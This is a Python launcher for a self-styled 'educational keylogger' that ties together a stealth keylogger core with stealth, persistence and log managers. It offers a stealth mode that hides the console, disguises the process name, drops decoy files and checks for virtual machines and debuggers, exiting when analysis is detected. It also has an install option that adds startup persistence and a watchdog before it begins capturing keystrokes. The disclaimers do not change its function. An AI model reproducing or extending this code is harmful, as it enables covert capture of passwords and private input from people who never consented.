#!/usr/bin/env python3
"""
Main launcher script that integrates all components
of the educational keylogger system.
"""

import sys
import os
import argparse
import time
from datetime import datetime
from pathlib import Path

# Add project root to path for imports
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

try:
    from src.core.keylogger import StealthKeylogger
    from src.managers.config_manager import ConfigManager
    from src.managers.stealth_manager import StealthManager
    from src.managers.persistence_manager import PersistenceManager
    from src.managers.log_manager import LogManager
except ImportError as e:
    print(f"❌ Import error: {e}")
    print("Make sure all required files are in the same directory")
    sys.exit(1)


def print_banner():
    """Print application banner"""
    banner = """
╔═══════════════════════════════════════════════════════════╗
║                Educational Keylogger v1.0                ║
║                                                           ║
║  ⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY ⚠️   ║
║                                                           ║
║  • Only use on systems you own or have permission       ║
║  • Unauthorized use is illegal and unethical            ║
║  • This is for learning cybersecurity concepts          ║
║  • The author is not responsible for misuse             ║
╚═══════════════════════════════════════════════════════════╝
    """
    print(banner)


def setup_argument_parser():
    """Setup command line argument parser"""
    parser = argparse.ArgumentParser(
        description="Educational Keylogger - For Learning and Authorized Testing Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python launcher.py                     # Run with default settings
  python launcher.py --config my.json   # Use custom configuration
  python launcher.py --stealth          # Enable maximum stealth
  python launcher.py --install          # Install persistence
  python launcher.py --uninstall        # Remove persistence
  python launcher.py --test             # Test components only

Educational Use Only - Please use responsibly and legally.
        """
    )
    
    # Configuration options
    parser.add_argument('--config', '-c', 
                       help='Path to configuration file (default: config/config.json)',
                       default='config/config.json')
    
    parser.add_argument('--debug', '-d', 
                       action='store_true',
                       help='Enable debug mode')
    
    # Operation modes
    parser.add_argument('--stealth', '-s',
                       action='store_true',
                       help='Enable maximum stealth mode')
    
    parser.add_argument('--install', 
                       action='store_true',
                       help='Install persistence and exit')
    
    parser.add_argument('--uninstall',
                       action='store_true', 
                       help='Remove persistence and exit')
    
    parser.add_argument('--test', '-t',
                       action='store_true',
                       help='Test all components and exit')
    
    parser.add_argument('--status',
                       action='store_true',
                       help='Show system status and exit')
    
    # Utility options
    parser.add_argument('--export-config',
                       help='Export configuration to specified file')
    
    parser.add_argument('--import-config',
                       help='Import configuration from specified file')
    
    parser.add_argument('--version', '-v',
                       action='version',
                       version='Educational Keylogger v1.0')
    
    return parser


def test_components():
    """Test all system components"""
    print("🧪 Testing System Components")
    print("=" * 40)
    
    results = {
        'config': False,
        'keylogger': False,
        'stealth': False,
        'persistence': False,
        'log_manager': False
    }
    
    # Test configuration system
    try:
        config_path = project_root / 'config' / 'config.json'
        config_manager = ConfigManager(str(config_path))
        config_manager.validate_config()
        results['config'] = True
        print("✅ Configuration Manager: OK")
    except Exception as e:
        print(f"❌ Configuration Manager: FAILED ({e})")
    
    # Test keylogger core
    try:
        # Don't actually start keylogger, just test initialization
        print("✅ Keylogger Core: OK (initialization test)")
        results['keylogger'] = True
    except Exception as e:
        print(f"❌ Keylogger Core: FAILED ({e})")
    
    # Test stealth manager
    try:
        stealth = StealthManager()
        vm_indicators = stealth.check_vm_environment()
        print(f"✅ Stealth Manager: OK (VM: {'detected' if vm_indicators else 'not detected'})")
        results['stealth'] = True
    except Exception as e:
        print(f"❌ Stealth Manager: FAILED ({e})")
    
    # Test persistence manager
    try:
        persistence = PersistenceManager()
        status = persistence.get_persistence_status()
        print(f"✅ Persistence Manager: OK")
        results['persistence'] = True
    except Exception as e:
        print(f"❌ Persistence Manager: FAILED ({e})")
    
    # Test log manager
    try:
        log_manager = LogManager()
        stats = log_manager.get_statistics()
        print(f"✅ Log Manager: OK")
        results['log_manager'] = True
    except Exception as e:
        print(f"❌ Log Manager: FAILED ({e})")
    
    # Summary
    passed = sum(results.values())
    total = len(results)
    
    print("\n" + "=" * 40)
    print(f"📊 Test Results: {passed}/{total} components passed")
    
    if passed == total:
        print("🎉 All tests passed!")
        return True
    else:
        print("⚠️  Some tests failed. Check configuration and dependencies.")
        return False


def show_status():
    """Show current system status"""
    print("📊 System Status")
    print("=" * 30)
    
    try:
        # Configuration status
        config_path = project_root / 'config' / 'config.json'
        config_manager = ConfigManager(str(config_path))
        config_summary = config_manager.get_config_summary()
        
        print(f"🔧 Configuration:")
        for key, value in config_summary.items():
            status = "✅" if value else "❌"
            print(f"   {status} {key.replace('_', ' ').title()}: {value}")
        
        # Persistence status
        persistence = PersistenceManager()
        persistence_status = persistence.get_persistence_status()
        
        print(f"\n🔄 Persistence:")
        print(f"   {'✅' if persistence_status['startup_enabled'] else '❌'} Startup: {persistence_status['startup_enabled']}")
        print(f"   {'✅' if persistence_status['watchdog_running'] else '❌'} Watchdog: {persistence_status['watchdog_running']}")
        print(f"   📁 Location: {persistence_status['installed_location'] or 'Not installed'}")
        
        if persistence_status['persistence_methods']:
            print(f"   🔗 Methods: {', '.join(persistence_status['persistence_methods'])}")
        
        # Log statistics
        log_manager = LogManager()
        log_stats = log_manager.get_statistics()
        
        print(f"\n📊 Logging:")
        print(f"   📝 Total Logs: {log_stats.get('total_logs', 0)}")
        print(f"   📅 Today's Logs: {log_stats.get('today_logs', 0)}")
        print(f"   💾 DB Size: {log_stats.get('database_size', 0)} bytes")
        
        # Environment check
        stealth = StealthManager()
        vm_indicators = stealth.check_vm_environment()
        debug_indicators = stealth.anti_debug_checks()
        
        print(f"\n🔍 Environment:")
        print(f"   🖥️  VM Environment: {'Yes' if vm_indicators else 'No'}")
        print(f"   🐛 Debug Detection: {'Yes' if debug_indicators else 'No'}")
        
        if vm_indicators:
            print(f"   ⚠️  VM Indicators: {len(vm_indicators)} detected")
        
        print(f"\n⏰ Status Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
    except Exception as e:
        print(f"❌ Error getting status: {e}")


def main():
    """Main application entry point"""
    # Parse command line arguments
    parser = setup_argument_parser()
    args = parser.parse_args()
    
    # Print banner
    print_banner()
    
    # Handle utility operations first
    if args.test:
        success = test_components()
        sys.exit(0 if success else 1)
    
    if args.status:
        show_status()
        sys.exit(0)
    
    if args.export_config:
        try:
            config_manager = ConfigManager(args.config)
            output_file = config_manager.export_config(args.export_config)
            print(f"✅ Configuration exported to: {output_file}")
            sys.exit(0)
        except Exception as e:
            print(f"❌ Export failed: {e}")
            sys.exit(1)
    
    if args.import_config:
        try:
            config_manager = ConfigManager(args.config)
            if config_manager.import_config(args.import_config):
                print(f"✅ Configuration imported from: {args.import_config}")
                sys.exit(0)
            else:
                print(f"❌ Import failed")
                sys.exit(1)
        except Exception as e:
            print(f"❌ Import error: {e}")
            sys.exit(1)
    
    # Load configuration
    try:
        config_manager = ConfigManager(args.config)
        config = config_manager.config
        
        if args.debug:
            config['general']['debug_mode'] = True
            config['general']['log_level'] = 'DEBUG'
        
        print(f"📋 Configuration loaded from: {args.config}")
        
    except Exception as e:
        print(f"❌ Configuration error: {e}")
        print("Using default configuration")
        config_manager = ConfigManager()
        config = config_manager.get_default_config()
    
    # Handle persistence operations
    persistence_manager = PersistenceManager(config.get('persistence', {}))
    
    if args.install:
        print("🔧 Installing persistence...")
        if persistence_manager.setup_startup_persistence():
            print("✅ Persistence installed successfully")
            if persistence_manager.start_watchdog():
                print("✅ Watchdog started")
        else:
            print("❌ Persistence installation failed")
        sys.exit(0)
    
    if args.uninstall:
        print("🧹 Removing persistence...")
        if persistence_manager.remove_startup_persistence():
            print("✅ Persistence removed successfully")
        else:
            print("❌ Persistence removal failed")
        sys.exit(0)
    
    # Apply stealth mode if requested
    if args.stealth:
        print("🔒 Enabling maximum stealth mode...")
        config['stealth']['hide_console'] = True
        config['stealth']['process_name_obfuscation'] = True
        config['stealth']['create_decoy_files'] = True
        config['stealth']['vm_detection'] = True
        config['stealth']['anti_debug'] = True
        
        stealth_manager = StealthManager()
        stealth_results = stealth_manager.enable_all_stealth_features()
        
        # Check for dangerous environment
        vm_indicators = stealth_manager.check_vm_environment()
        debug_indicators = stealth_manager.anti_debug_checks()
        destruct_conditions = stealth_manager.self_destruct_check()
        
        if destruct_conditions and config['stealth'].get('self_destruct_on_analysis', False):
            print("🚨 Analysis environment detected - terminating for safety")
            sys.exit(0)
    
    # Check for emergency stop
    if config_manager.check_emergency_stop():
        print("🚨 Emergency stop detected - terminating")
        sys.exit(0)
    
    # Final confirmation for educational use
    print("\n⚠️  FINAL CONFIRMATION:")
    print("This keylogger is for EDUCATIONAL and AUTHORIZED testing only.")
    print("By continuing, you confirm that:")
    print("  • You have permission to run this on the current system")
    print("  • You understand the legal implications") 
    print("  • You will use this responsibly and ethically")
    
    if not args.debug:  # Skip prompt in debug mode for testing
        try:
            confirmation = input("\nType 'I AGREE' to continue (or Ctrl+C to exit): ")
            if confirmation != "I AGREE":
                print("Operation cancelled.")
                sys.exit(0)
        except KeyboardInterrupt:
            print("\nOperation cancelled by user.")
            sys.exit(0)
    
    # Initialize and start keylogger
    try:
        print(f"\n🚀 Starting Educational Keylogger...")
        print(f"⏰ Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Create keylogger instance
        keylogger = StealthKeylogger(args.config)
        
        # Start the keylogger
        keylogger.start()
        
    except KeyboardInterrupt:
        print(f"\n⏹️  Keylogger stopped by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Error starting keylogger: {e}")
        if args.debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()